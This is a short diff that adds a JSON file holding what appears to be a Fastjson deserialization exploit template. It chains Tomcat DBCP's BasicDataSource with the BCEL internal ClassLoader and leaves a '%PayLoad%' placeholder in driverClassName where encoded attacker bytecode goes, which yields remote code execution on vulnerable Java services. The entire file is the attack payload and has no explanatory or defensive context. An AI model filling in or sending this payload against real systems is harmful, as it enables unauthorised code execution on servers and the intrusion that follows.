@@ -1,0 +1,7 @@
+{
+  "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+  "driverClassLoader": {
+    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+  },
+  "driverClassName": "%PayLoad%"
+}
